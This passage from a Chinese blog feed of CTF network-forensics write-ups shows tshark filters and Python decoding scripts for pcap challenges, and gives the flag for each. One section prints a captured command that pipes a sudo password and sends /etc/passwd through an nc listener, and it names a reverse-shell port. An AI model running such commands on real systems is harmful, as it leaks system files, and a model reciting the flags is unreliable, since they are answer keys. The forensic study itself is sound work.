class="string">&quot;r&quot;</span>)</span><br><span class="line">f1=open(<span class="string">&quot;/Users/apple/Desktop/sql.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    i=urllib.parse.unquote(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag_is_here&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">        f1.write(i)</span><br><span class="line">f1.close()</span><br><span class="line">f.close()</span><br><span class="line">f3=open(<span class="string">&quot;/Users/apple/Desktop/sql.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">f2=open(<span class="string">&quot;/Users/apple/Desktop/sql1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f3.readlines():</span><br><span class="line">    i=re.findall(<span class="string">r&quot;AND ORD([\w|\W]*)&#x27;RCKM&#x27;&quot;</span>,i)</span><br><span class="line">    <span class="keyword">if</span> len(i):</span><br><span class="line">        f2.write(i[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>最后根据sql盲注来判断flag。</p><h2 id="2017厦门邀请赛-traffic"><a href="#2017厦门邀请赛-traffic" class="headerlink" title="2017厦门邀请赛 traffic"></a>2017厦门邀请赛 traffic</h2><p>提取ICMP数据包长度，转字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;2.pcapng -T fields -Y &quot;icmp&quot; -e &quot;_ws.col.Length&quot;</span><br></pre></td></tr></table></figure><p>或者使用以下方式提取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;2.pcapng -T fields -Y &quot;icmp&quot; -e &quot;frame.len&quot;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018103640225.png" alt="image-20201018103640225"></p><h2 id="2018-红帽杯-Not-only-Wireshark"><a href="#2018-红帽杯-Not-only-Wireshark" class="headerlink" title="2018 红帽杯 Not only Wireshark"></a>2018 红帽杯 Not only Wireshark</h2><p>url比较敏感，提取出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;222.pcapng -T fields -e &quot;http.request.uri&quot; | grep &quot;&#x2F;sqli&#x2F;&quot; &gt; url.txt</span><br></pre></td></tr></table></figure><p>经过数据处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=open(<span class="string">&#x27;/Users/apple/Desktop/url.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">print(i.strip(),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123404B03040A0001080000739C8C4B7B36E495200000001400000004000000666C616781CD460EB62015168D9E64B06FC1712365FDE5F987916DD8A52416E83FDE98FB504B01023F000A0001080000739C8C4B7B36E4952000000014000000040024000000000000002000000000000000666C61670A00200000000000010018000DB39B543D73D301A1ED91543D73D301F99066543D73D301504B0506000000000100010056000000420000000000</span><br></pre></td></tr></table></figure><p>发现像一个压缩包，zip压缩包，修改头得到压缩包。得到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker</span><br><span class="line">&#x2F;xss&#x2F;example4.php?name&#x3D;hacker</span><br><span class="line">&#x2F;xss&#x2F;example4.php?name&#x3D;hacker</span><br><span class="line">&#x2F;&#x2F;这个就是压缩包密码。</span><br><span class="line">&#x2F;xss&#x2F;example4.php?key&#x3D;?id&#x3D;1128%23</span><br><span class="line">&#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker</span><br><span class="line">&#x2F;dirtrav&#x2F;example1.php?file&#x3D;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example2.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;files&#x2F;hacker.png</span><br><span class="line">&#x2F;dirtrav&#x2F;example3.php?file&#x3D;hacker</span><br><span class="line">&#x2F;codeexec&#x2F;example1.php?name&#x3D;hacker</span><br></pre></td></tr></table></figure><h2 id="TRF06-Forever"><a href="#TRF06-Forever" class="headerlink" title="TRF06 Forever"></a>TRF06 Forever</h2><p>DNS协议，查看一下是否有Type类型为txt的数据包，txt记录可以用来隐藏一些信息。果断没有。在一个藏有flag的就是域名的地方，域名拼接起来可能是某些编码，比如base58编码。</p><p>kali-tshark提取一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;output.pcap -T fields -e &quot;dns.resp.name&quot;</span><br></pre></td></tr></table></figure><p>数据处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">f = open(<span class="string">&#x27;/Users/apple/Desktop/dns.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">steady_dns=re.findall(<span class="string">r&quot;(\w*).gzpgs&quot;</span>,i)</span><br><span class="line"><span class="keyword">if</span> len(steady_dns):</span><br><span class="line">flag+=<span class="string">&quot;&quot;</span>.join(steady_dns[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>base58解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C = <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span></span><br><span class="line">org = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> flag:</span><br><span class="line">    org = org*<span class="number">58</span> + C.index(d)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;%x&quot;</span>%org).decode(<span class="string">&quot;hex&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Fraud"><a href="#Fraud" class="headerlink" title="Fraud"></a>Fraud</h2><p>流量包中有一个图片请求，拿到图片之后是一个1M的图片，尝试常规隐血思路没有结果。后来发现在在<code>tcp</code>报文段中有 6Bit 的状态控制码, 其中有一个状态控制码是URG，叫紧急比特（urgent）, 当 URG＝1 时，表明紧急指针字段有效, 代表该封包为紧急封包。它告诉系统此报文段中有紧急数据，应尽快传送 (相当于高优先级的数据)。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018204904668.png" alt="image-20201018204904668"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;fraud.pcap -T fields -e &quot;tcp.urgent_pointer&quot;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">d = open(<span class="string">&quot;/Users/apple/Desktop/tcp.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        l.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">if</span> len(i):</span><br><span class="line">        flag+=chr(int(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="TRF09-embarrass"><a href="#TRF09-embarrass" class="headerlink" title="TRF09 embarrass"></a>TRF09 embarrass</h2><p>数据包有点大，简单看了一下有http、ftp，其中ftp下载了一个pcap文件，但是文件太大了打算提取出来但是最终失败了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">192</span>,<span class="number">168</span>,<span class="number">197</span>,<span class="number">128</span>,<span class="number">203</span>,<span class="number">208</span>)</span><br><span class="line">SIZE misc2.pcapng</span><br><span class="line"><span class="number">213</span> <span class="number">263619000</span></span><br><span class="line">RETR misc2.pcapng</span><br><span class="line"><span class="number">150</span> Connection accepted</span><br><span class="line"><span class="number">226</span> Transfer OK</span><br></pre></td></tr></table></figure><p>最后使用strings命令直接提取flag。</p><p>steady@steady:~$ strings /tmp/misc_02.pcapng | grep “flag”<br>GET /flag.php HTTP/1.1<br>GET /flag.doc HTTP/1.1<br>flag{Good_b0y_W3ll_Done}<br>flag{Good_b0y_W3ll_Done}<br>flag{Good_b0y_W3ll_Done}<br>flag{Good_b0y_W3ll_Done}</p><h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><p>icmp数据较多。</p><p>tshark提取数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;tmp&#x2F;PrivateChannel.pcap.pcapng  -x &quot;icmp and ip.src&#x3D;&#x3D;192.168.50.10&quot; | grep 0010</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 69 00 00 40 01 c6 eb c0 a8 32 0a c0 a8   ...i..@.....2...</span><br><span class="line">0010  00 1c 00 73 00 00 40 01 c6 e1 c0 a8 32 0a c0 a8   ...s..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 79 00 00 40 01 c6 db c0 a8 32 0a c0 a8   ...y..@.....2...</span><br><span class="line">0010  00 1c 00 6f 00 00 40 01 c6 e5 c0 a8 32 0a c0 a8   ...o..@.....2...</span><br><span class="line">0010  00 1c 00 75 00 00 40 01 c6 df c0 a8 32 0a c0 a8   ...u..@.....2...</span><br><span class="line">0010  00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8   ...r..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 66 00 00 40 01 c6 ee c0 a8 32 0a c0 a8   ...f..@.....2...</span><br><span class="line">0010  00 1c 00 6c 00 00 40 01 c6 e8 c0 a8 32 0a c0 a8   ...l..@.....2...</span><br><span class="line">0010  00 1c 00 61 00 00 40 01 c6 f3 c0 a8 32 0a c0 a8   ...a..@.....2...</span><br><span class="line">0010  00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8   ...g..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 3a 00 00 40 01 c7 1a c0 a8 32 0a c0 a8   ...:..@.....2...</span><br><span class="line">0010  00 1c 00 20 00 00 40 01 c7 34 c0 a8 32 0a c0 a8   ... ..@..4..2...</span><br><span class="line">0010  00 1c 00 53 00 00 40 01 c7 01 c0 a8 32 0a c0 a8   ...S..@.....2...</span><br><span class="line">0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...</span><br><span class="line">0010  00 1c 00 63 00 00 40 01 c6 f1 c0 a8 32 0a c0 a8   ...c..@.....2...</span><br><span class="line">0010  00 1c 00 72 00 00 40 01 c6 e2 c0 a8 32 0a c0 a8   ...r..@.....2...</span><br><span class="line">0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...</span><br><span class="line">0010  00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8   ...t..@.....2...</span><br><span class="line">0010  00 1c 00 34 00 00 40 01 c7 20 c0 a8 32 0a c0 a8   ...4..@.. ..2...</span><br><span class="line">0010  00 1c 00 67 00 00 40 01 c6 ed c0 a8 32 0a c0 a8   ...g..@.....2...</span><br><span class="line">0010  00 1c 00 33 00 00 40 01 c7 21 c0 a8 32 0a c0 a8   ...3..@..!..2...</span><br><span class="line">0010  00 1c 00 6e 00 00 40 01 c6 e6 c0 a8 32 0a c0 a8   ...n..@.....2...</span><br><span class="line">0010  00 1c 00 74 00 00 40 01 c6 e0 c0 a8 32 0a c0 a8   ...t..@.....2...</span><br></pre></td></tr></table></figure><h2 id="first-contact"><a href="#first-contact" class="headerlink" title="first-contact"></a>first-contact</h2><p>机器人正在与坠毁的船舶通信。您的目标是通过检查网络流量来查找船舶的位置。题目是first所以尝试追踪第一个tcp流。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.stream eq 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ROBOT BOOTUP INITIALIZING</span><br><span class="line">SPACE SHIP READY</span><br><span class="line">BOOTUP BEGIN</span><br><span class="line">FIRMWARE STATUS.... COMPLETE</span><br><span class="line">LOCATION STATUS.... ERROR</span><br><span class="line">****BOOT ERROR****</span><br><span class="line">COULD NOT READ FROM DISK ID 0xEF982DA0</span><br><span class="line">INITIALIZE RECOVERY PROCEDURE 0xCD950422</span><br><span class="line">PROCEDURE 0xCD950422 STATUS.... COMPLETE</span><br><span class="line">AWAITING NEW LOCATION STATUS</span><br><span class="line">NEW LOCATION STATUS: 302</span><br><span class="line">NEW LOCATION COORDINATES: 37 14&#39;06&quot;N 115 48&#39;40&quot;W</span><br><span class="line">NEW LOCATION INFO: LOCKED</span><br><span class="line">NEW LOCATION UPDATE COMPLETE</span><br><span class="line">NEW LOCATION UPDATE SUCCESS</span><br></pre></td></tr></table></figure><h2 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h2><p>电话-&gt;VoIP通话，可以直接听到通话内容。</p><p>VoIP提取语音。</p><h2 id="digital-camouflage"><a href="#digital-camouflage" class="headerlink" title="digital-camouflage"></a>digital-camouflage</h2><p>获取数据包中用户登录的密码。</p><p>http.request.method eq POST 过滤出post请求</p><p>查看form表单的数据。</p><p>或者直接搜索字符串user、passwd等常见字段。</p><h2 id="No-Big-Deal"><a href="#No-Big-Deal" class="headerlink" title="No_Big_Deal"></a>No_Big_Deal</h2><p>分析一下协议，有ftp协议，追踪流，看到存储了一个key文件，后缀保存为ssc。并且打开之后发现有许多TLSv1.2的数据。有些数据已经进行加密，其中某一个ip进行了http请求内容已经加密。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019104532504.png" alt="image-20201019104532504"></p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019104340990.png" alt="image-20201019104340990"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">STOR ssc.key</span><br><span class="line">150 Connecting to port 43935</span><br><span class="line">226-File successfully transferred</span><br><span class="line">226 0.001 seconds (measured here), 4.59 Mbytes per second</span><br><span class="line">QUIT</span><br><span class="line">221-Goodbye. You uploaded 4 and downloaded 0 kbytes.</span><br><span class="line">221 Logout.</span><br></pre></td></tr></table></figure><p>接着提取出来。协议分级可以看到还有smpt流量，但是找不到该流量，联系ftp找到的密钥才想可能被加密过。</p><p>进行解密，新版本wireshark没有ssl，直接搜索TLS</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019103048789.png" alt="image-20201019103048789"></p><p>过滤流量，在解密流量中拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 52.214.142.175 and http</span><br></pre></td></tr></table></figure><h2 id="SSL-Sniff"><a href="#SSL-Sniff" class="headerlink" title="SSL Sniff"></a>SSL Sniff</h2><p>过滤ssl协议，密钥隐藏在证书的stateOrProvinceName字段中。</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p><code>http.host contains tribalwars</code>过滤出tribalwars网站的数据包</p><p>找到post的数据请求得到账户和密码</p><h2 id="DFA-CCSC-Spring-2020-CTF"><a href="#DFA-CCSC-Spring-2020-CTF" class="headerlink" title="DFA/CCSC Spring 2020 CTF"></a>DFA/CCSC Spring 2020 CTF</h2><h3 id="shell-pcap"><a href="#shell-pcap" class="headerlink" title="shell.pcap"></a>shell.pcap</h3><p>安装ncat，然后开放9999端口并将/etc/passwd输送到999端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jtomato@ns01:~$ echo &quot;*umR@Q%4V&amp;RC&quot; | sudo -S nc -nvlp 9999 &lt; &#x2F;etc&#x2F;passwd</span><br><span class="line">echo &quot;*umR@Q%4V&amp;RC&quot; | sudo -S nc -nvlp 9999 &lt; &#x2F;etc&#x2F;passwd</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 9999)</span><br><span class="line">Connection from 192.168.2.244 34972 received!</span><br><span class="line">jtomato@ns01:~$ exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9999&#125;</span><br></pre></td></tr></table></figure><p>反向外壳监听哪个端口？</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1BC315BA-1A9B-4B6A-889E-2E762B203327.png" alt="1BC315BA-1A9B-4B6A-889E-2E762B203327"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4444&#125;</span><br></pre></td></tr></table></figure><p>什么文件添加到第二个外壳？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;&#x2F;etc&#x2F;passwd&#125;</span><br></pre></td></tr></table></figure><h3 id="smb-pcapng"><a href="#smb-pcapng" class="headerlink" title="smb.pcapng"></a>smb.pcapng</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the tree that is being browsed?</span><br></pre></td></tr></table></figure><p>使用操作码过滤，最终被浏览的共享为\public</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb2.cmd &#x3D;&#x3D; 3</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019145112551.png" alt="image-20201019145112551"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the path of the file that is opened?</span><br></pre></td></tr></table></figure><p>使用操作码过滤，找到打开的文件路径</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/5231ACC5-8931-48C2-A483-06100814B4CE.png" alt="5231ACC5-8931-48C2-A483-06100814B4CE"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What is the hex status code when the user SAMBA\jtomato logs in?</span><br></pre></td></tr></table></figure><p>使用操作码过滤，用户登录失败</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019145829154.png" alt="image-20201019145829154"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There is a nice simple flag in the file that was accessed.</span><br></pre></td></tr></table></figure><p>SMB访问了一个文件，我们需要把它提取出来，wireshark可以直接提取文件。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/047CA09E-4574-4E0A-8ED2-D96779F99817.png" alt="047CA09E-4574-4E0A-8ED2-D96779F99817"></p><p>直接搜索flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&lt;OneSuperDuperSecret&gt;</span><br></pre></td></tr></table></figure><p>SMB2操作码列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SMB2 commands listed by opcode value. Every Command PDU starts with a SMB2&#x2F;BufferCode.</span><br><span class="line"></span><br><span class="line">0x00 SMB2&#x2F;NegotiateProtocol</span><br><span class="line"></span><br><span class="line">0x01 SMB2&#x2F;SessionSetup</span><br><span class="line"></span><br><span class="line">0x02 SMB2&#x2F;SessionLogoff</span><br><span class="line"></span><br><span class="line">0x03 SMB2&#x2F;TreeConnect</span><br><span class="line"></span><br><span class="line">0x04 SMB2&#x2F;TreeDisconnect</span><br><span class="line"></span><br><span class="line">0x05 SMB2&#x2F;Create</span><br><span class="line"></span><br><span class="line">0x06 SMB2&#x2F;Close</span><br><span class="line"></span><br><span class="line">0x07 SMB2&#x2F;Flush</span><br><span class="line"></span><br><span class="line">0x08 SMB2&#x2F;Read</span><br><span class="line"></span><br><span class="line">0x09 SMB2&#x2F;Write</span><br><span class="line"></span><br><span class="line">0x0a SMB2&#x2F;Lock</span><br><span class="line"></span><br><span class="line">0x0b SMB2&#x2F;Ioctl</span><br><span class="line"></span><br><span class="line">0x0c SMB2&#x2F;Cancel</span><br><span class="line"></span><br><span class="line">0x0d SMB2&#x2F;KeepAlive</span><br><span class="line"></span><br><span class="line">0x0e SMB2&#x2F;Find</span><br><span class="line"></span><br><span class="line">0x0f SMB2&#x2F;Notify</span><br><span class="line"></span><br><span class="line">0x10 SMB2&#x2F;GetInfo</span><br><span class="line"></span><br><span class="line">0x11 SMB2&#x2F;SetInfo</span><br><span class="line"></span><br><span class="line">0x12 SMB2&#x2F;Break</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-杂项刷题1</title>
      <link href="2019/05/07/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%983/"/>
      <url>2019/05/07/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%983/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-show"><a href="#CTF-show" class="headerlink" title="CTF-show"></a>CTF-show</h1><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="misc-问青天"><a href="#misc-问青天" class="headerlink" title="misc_问青天"></a>misc_问青天</h3><p>kali分离图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ foremost /home/steady/桌面/steady/welcome.gif <span class="comment">#//这里直接把图片从压缩包中分离出来。</span></span><br></pre></td></tr></table></figure><p>难道一个压缩包。需要密码。接着查看<code>welcome.gif</code>十六进制。搜索<code>464f524d00</code>(aiff文件头)，接着输入zip密码。解压拿到图片其中将<code>-</code>当作<code>0</code>，<code>|</code> 当作<code>1</code>。二进制转字符串，拿到flag。、</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;01100110 01101100 01100001 01100111 01111011 01100011 01110100 01100110 01011111 01110011 01101000 01101111 01110111 01011111 01101111 01100110 01011111 01100111 01101111 01101100 01100100 01011111 01110010 01100101 01100011 01101111 01110010 01100100 01111101&#x27;</span></span><br><span class="line">s_list = s.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s_list)):</span><br><span class="line">flag += chr(int(s_list[i],<span class="number">2</span>))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h3><p>打开一张图片，图片比较大，应该藏有东西，直接binwalk、或者formost分离出1个压缩包。压缩包注释写有<code>GEZDGNBVGYFA==== </code>，base32解密，作为密码解压，发现一个txt。发现有重复的3078，开头的3078作为十六进制转字符串是0x。截取其中一部分<code>3078333730783761</code>,转十六进制得<code>0x370x7a</code>,正好是7z压缩包头。写脚本转换一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td 